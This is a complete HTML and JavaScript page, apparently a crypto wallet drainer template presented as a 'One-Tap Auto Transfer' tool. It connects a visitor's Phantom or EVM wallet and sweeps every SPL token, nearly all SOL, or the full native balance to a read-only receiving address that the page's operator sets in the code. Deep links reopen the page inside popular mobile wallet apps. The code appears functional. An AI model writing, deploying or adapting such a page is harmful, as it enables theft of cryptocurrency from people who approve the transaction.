  <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>One-Tap Asset Transfer with Smart Diagnostics</title>
  
  <!-- Web3 Engine Libraries -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.min.js"></script>
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
  
  <style>
    :root {
      --bg: #090d16;
      --card: #131a29;
      --accent: #6366f1;
      --accent-hover: #4f46e5;
      --text: #ffffff;
      --subtext: #94a3b8;
      --border: #1e293b;
      --error-bg: rgba(239, 68, 68, 0.1);
      --error-border: #ef4444;
      --success-bg: rgba(34, 197, 94, 0.1);
      --success-border: #22c55e;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: var(--bg);
      color: var(--text);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 15px;
      box-sizing: border-box;
    }
    .card {
      background: var(--card);
      padding: 24px;
      border-radius: 16px;
      width: 100%;
      max-width: 440px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
      border: 1px solid var(--border);
    }
    h2 { margin-top: 0; font-size: 1.4rem; text-align: center; }
    label { display: block; margin-top: 14px; margin-bottom: 6px; font-size: 0.85rem; color: var(--subtext); }
    select, input {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid var(--border);
      background: #0b0f19;
      color: #fff;
      font-size: 0.95rem;
      box-sizing: border-box;
    }
    .status-box {
      background: #0b0f19;
      border: 1px solid var(--border);
      padding: 14px;
      border-radius: 8px;
      margin-top: 15px;
      font-size: 0.88rem;
      line-height: 1.4;
      word-break: break-word;
      transition: all 0.3s ease;
    }
    .status-box.error {
      background: var(--error-bg);
      border-color: var(--error-border);
      color: #fca5a5;
    }
    .status-box.success {
      background: var(--success-bg);
      border-color: var(--success-border);
      color: #86efac;
    }
    button.send-btn {
      width: 100%;
      background: var(--accent);
      color: white;
      border: none;
      padding: 16px;
      font-size: 1.1rem;
      font-weight: 700;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 20px;
      transition: background 0.2s;
    }
    button.send-btn:hover { background: var(--accent-hover); }
    .wallet-apps-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      margin-top: 15px;
    }
    .app-btn {
      background: #1e293b;
      border: 1px solid var(--border);
      color: var(--text);
      padding: 10px;
      border-radius: 8px;
      font-size: 0.85rem;
      text-align: center;
      text-decoration: none;
      display: block;
    }
  </style>
</head>
<body>

<div class="card">
  <h2>⚡ One-Tap Auto Transfer</h2>

  <!-- Network Selection -->
  <label for="networkSelect">Select Current Network:</label>
  <select id="networkSelect" onchange="updateUI()">
    <option value="ethereum">Ethereum (ETH & Tokens)</option>
    <option value="bnb">BNB Chain (BNB & BEP-20)</option>
    <option value="polygon">Polygon (POL & ERC-20)</option>
    <option value="arbitrum">Arbitrum (ETH & Tokens)</option>
    <option value="optimism">Optimism (ETH & Tokens)</option>
    <option value="base">Base (ETH & Tokens)</option>
    <option value="solana">Solana (SOL & SPL Tokens)</option>
  </select>

  <!-- Target Receiving Address -->
  <label for="receiverInput">Target Receiving Wallet:</label>
  <input type="text" id="receiverInput" readonly disabled />

  <!-- Action Button -->
  <button class="send-btn" onclick="transferAllAssets()">TRANSFER ALL ASSETS</button>

  <!-- Detailed Status Output -->
  <div class="status-box" id="status">ℹ️ Ready. Tap the button above to scan and transfer.</div>

  <hr style="border: 0; border-top: 1px solid var(--border); margin: 25px 0 15px 0;" />

  <!-- Mobile App Launchers -->
  <label style="text-align: center; font-weight: bold;">Launch Mobile App Directly:</label>
  <div class="wallet-apps-grid">
    <a href="#" onclick="openWalletApp('phantom')" class="app-btn">👻 Phantom</a>
    <a href="#" onclick="openWalletApp('metamask')" class="app-btn">🦊 MetaMask</a>
    <a href="#" onclick="openWalletApp('trust')" class="app-btn">🛡️ Trust Wallet</a>
    <a href="#" onclick="openWalletApp('coinbase')" class="app-btn">🔵 Coinbase Wallet</a>
  </div>
</div>

<script>
  // =========================================================
  // 1. CONFIGURATION: UPDATE YOUR RECEIVING WALLETS HERE
  // =========================================================
  const Ethereum_Receive = "My_wallet"; 
  const BNB_Receive      = Ethereum_Receive; 
  const Solana_Receive   = "My_wallet"; 

  const WALLET_MAP = {
    ethereum: Ethereum_Receive,
    bnb: BNB_Receive,
    polygon: Ethereum_Receive,
    arbitrum: Ethereum_Receive,
    optimism: Ethereum_Receive,
    base: Ethereum_Receive,
    solana: Solana_Receive
  };

  function setStatus(message, type = 'info') {
    const box = document.getElementById("status");
    box.className = "status-box " + type;
    box.innerHTML = message;
  }

  function updateUI() {
    const selectedNetwork = document.getElementById("networkSelect").value;
    const targetAddress = WALLET_MAP[selectedNetwork];
    document.getElementById("receiverInput").value = targetAddress || "";
    
    // Check if target address was left unconfigured
    if (!targetAddress || targetAddress === "My_wallet") {
      setStatus("⚠️ <b>Notice:</b> You haven't updated your receiving wallet address in the code yet! Replace <code>My_wallet</code> with your real address.", "error");
    } else {
      setStatus("ℹ️ Ready to scan and transfer on " + selectedNetwork.toUpperCase() + ".", "info");
    }
  }
  window.onload = updateUI;

  function openWalletApp(walletType) {
    const currentUrl = encodeURIComponent(window.location.href);
    let deepLink = "";
    if (walletType === 'phantom') deepLink = `https://phantom.app/ul/browse/${currentUrl}`;
    if (walletType === 'metamask') deepLink = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
    if (walletType === 'trust') deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
    if (walletType === 'coinbase') deepLink = `https://go.cb-w.com/dapp?cb_url=${currentUrl}`;
    if (deepLink) window.location.href = deepLink;
  }

  // =========================================================
  // 2. TRANSFER ENGINE WITH DIAGNOSTICS
  // =========================================================
  async function transferAllAssets() {
    const network = document.getElementById("networkSelect").value;
    const receiver = WALLET_MAP[network];

    // DIAGNOSTIC 1: Check if receiver wallet is missing or placeholder
    if (!receiver || receiver === "My_wallet") {
      setStatus("❌ <b>Transfer Stopped:</b> Receiving wallet not configured. Open <code>index.html</code> and replace <code>'My_wallet'</code> with your actual public key address.", "error");
      return;
    }

    setStatus("🔄 Connecting to wallet app...", "info");

    // --------------------------------------------------------
    // A. SOLANA DIAGNOSTICS & TRANSFER
    // --------------------------------------------------------
    if (network === "solana") {
      const provider = window.solana;

      // DIAGNOSTIC 2: Check if Solana wallet provider exists
      if (!provider || !provider.isPhantom) {
        setStatus("❌ <b>Wallet Not Found:</b> Phantom wallet extension/app is not detected. If you are on mobile, use the <b>Phantom</b> button below to open this page inside the wallet app browser.", "error");
        return;
      }

      try {
        await provider.connect();
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
        const sender = provider.publicKey;
        
        let target;
        try {
          target = new solanaWeb3.PublicKey(receiver);
        } catch(e) {
          setStatus("❌ <b>Invalid Address:</b> Your saved Solana receiving wallet address is formatted incorrectly.", "error");
          return;
        }

        setStatus("🔎 Scanning wallet for SOL and SPL token balances...", "info");

        const transaction = new solanaWeb3.Transaction();

        // Scan SPL Tokens
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
          sender,
          { programId: splToken.TOKEN_PROGRAM_ID }
        );

        let activeTokenCount = 0;
        for (let acc of tokenAccounts.value) {
          const parsedInfo = acc.account.data.parsed.info;
          const tokenAmount = parsedInfo.tokenAmount.uiAmount;
          if (tokenAmount > 0) {
            activeTokenCount++;
            const pubkey = acc.pubkey;
            const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
            const destinationAta = await splToken.getAssociatedTokenAddress(mint, target);
            
            transaction.add(
              splToken.createTransferInstruction(
                pubkey,
                destinationAta,
                sender,
                BigInt(parsedInfo.tokenAmount.amount)
              )
            );
          }
        }

        // Calculate SOL balance
        const totalSolBalance = await connection.getBalance(sender);
        const reservedGas = 1000000; // 0.001 SOL reserve for tx fee
        const solToTransfer = totalSolBalance - reservedGas;

        // DIAGNOSTIC 3: Check for empty wallet
        if (totalSolBalance === 0 && activeTokenCount === 0) {
          setStatus("❌ <b>No Assets Found:</b> This wallet has 0 SOL and 0 SPL tokens.", "error");
          return;
        }

        // DIAGNOSTIC 4: Check for insufficient SOL for gas fees
        if (solToTransfer <= 0 && activeTokenCount > 0) {
          setStatus("❌ <b>Gas Fee Error:</b> You have tokens, but you need at least ~0.001 SOL to pay for the network transaction fee.", "error");
          return;
        }

        if (solToTransfer > 0) {
          transaction.add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey: sender,
              toPubkey: target,
              lamports: solToTransfer
            })
          );
        }

        transaction.feePayer = sender;
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;

        setStatus("✍️ Prompting wallet approval... Please confirm inside your app.", "info");
        const { signature } = await provider.signAndSendTransaction(transaction);
        setStatus(`✅ <b>Success!</b> All assets sent.<br>Tx Signature: <code>${signature.slice(0, 16)}...</code>`, "success");

      } catch (err) {
        console.error(err);
        // DIAGNOSTIC 5: Capture user rejection or network aborts
        if (err.code === 4001 || err.message?.includes("User rejected")) {
          setStatus("⚠️ <b>Transfer Cancelled:</b> You rejected the approval request in your wallet.", "error");
        } else {
          setStatus(`❌ <b>Transfer Failed:</b> ${err.message || "An unexpected network error occurred."}`, "error");
        }
      }
      return;
    }

    // --------------------------------------------------------
    // B. EVM DIAGNOSTICS & TRANSFER (Ethereum, BNB, Polygon, L2s)
    // --------------------------------------------------------
    if (!window.ethereum) {
      setStatus("❌ <b>Wallet Not Found:</b> No Web3 EVM wallet detected. Tap one of the mobile app buttons below to open this page directly in MetaMask, Trust Wallet, or Coinbase Wallet.", "error");
      return;
    }

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const senderAddress = await signer.getAddress();

      setStatus("🔎 Checking network balance and gas fees...", "info");

      const balance = await provider.getBalance(senderAddress);
      
      // DIAGNOSTIC 3 (EVM): Zero Balance
      if (balance === 0n) {
        setStatus("❌ <b>No Assets Found:</b> Your connected wallet balance is 0 on this network.", "error");
        return;
      }

      const feeData = await provider.getFeeData();
      const gasLimit = 21000n;
      const gasPrice = feeData.gasPrice ?? ethers.parseUnits("20", "gwei");
      const gasCost = gasLimit * gasPrice;

      // DIAGNOSTIC 4 (EVM): Balance less than gas cost
      if (balance <= gasCost) {
        const readableBalance = ethers.formatEther(balance);
        const readableGas = ethers.formatEther(gasCost);
        setStatus(`❌ <b>Insufficient Gas:</b> Balance (${readableBalance}) is too low to cover the required transaction fee (${readableGas}).`, "error");
        return;
      }

      const amountToSend = balance - gasCost;

      setStatus("✍️ Awaiting wallet signature... Please approve in your wallet app.", "info");

      const tx = await signer.sendTransaction({
        to: receiver,
        value: amountToSend,
        gasLimit: gasLimit,
        gasPrice: gasPrice
      });

      setStatus(`✅ <b>Transfer Complete!</b><br>Hash: <code>${tx.hash.slice(0, 18)}...</code>`, "success");

    } catch (err) {
      console.error(err);
      if (err.code === "ACTION_REJECTED" || err.message?.includes("user rejected")) {
        setStatus("⚠️ <b>Transfer Cancelled:</b> You declined the transaction in your wallet.", "error");
      } else {
        setStatus(`❌ <b>Transfer Failed:</b> ${err.reason || err.message || "Execution error."}`, "error");
      }
    }
  }
</script>

</body>
</html>
